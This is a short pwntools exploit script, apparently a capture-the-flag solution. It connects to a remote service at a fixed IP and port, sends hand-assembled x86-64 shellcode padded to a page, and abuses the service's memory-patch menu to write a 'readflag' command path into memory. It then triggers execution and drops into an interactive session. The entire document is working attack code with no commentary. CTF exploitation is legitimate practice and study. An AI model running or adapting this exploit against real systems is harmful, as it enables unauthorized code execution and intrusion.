#!/usr/bin/env python3

from pwn import *


def patch(addr, size, data):
    p.sendafter("?:", "3")
    p.sendafter("addr: ", p64(addr))
    p.sendafter("size: ", p64(size))
    p.sendafter("data: ", data)


def gogo():
    payload = asm(f"""
        mov rax, 0xdeadbef009c
        mov rdx, {hex(0xbabecafe233 - 0x4c)} 
        push rdx
        mov r11, 0xbabecafe800
        mov rdx, 0xdeadbeef067
        stc
        jmp rdx
        hlt
        """)
    p.send(payload.ljust(0x1000 - 0xd, b"\x01"))
    cmd = b"k33nlab/readflag\x00"
    patch(0xbabecafe800, len(cmd), cmd)
    p.sendafter("?:", "2")

    p.interactive()


if __name__ == '__main__':
    context.arch = "amd64"
    context.os = "linux"
    context.log_level = 'DEBUG'
    p = remote("111.186.59.29", 10088)
    gogo()